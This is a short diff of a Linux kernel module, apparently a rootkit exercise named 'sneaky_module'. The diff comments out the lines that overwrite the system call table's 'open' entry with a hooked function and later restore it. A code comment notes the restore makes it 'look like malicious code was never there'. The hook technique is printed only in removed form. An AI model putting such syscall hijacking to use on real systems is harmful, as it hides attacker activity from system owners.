@@ -68,8 +68,8 @@ static int initialize_sneaky_module(void)
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
-  original_call = (void*)*(sys_call_table + __NR_open);
-  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  //original_call = (void*)*(sys_call_table + __NR_open);
+  //*(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -97,7 +97,7 @@ static void exit_sneaky_module(void)
 
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  // *(sys_call_table + __NR_open) = (unsigned long)original_call;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
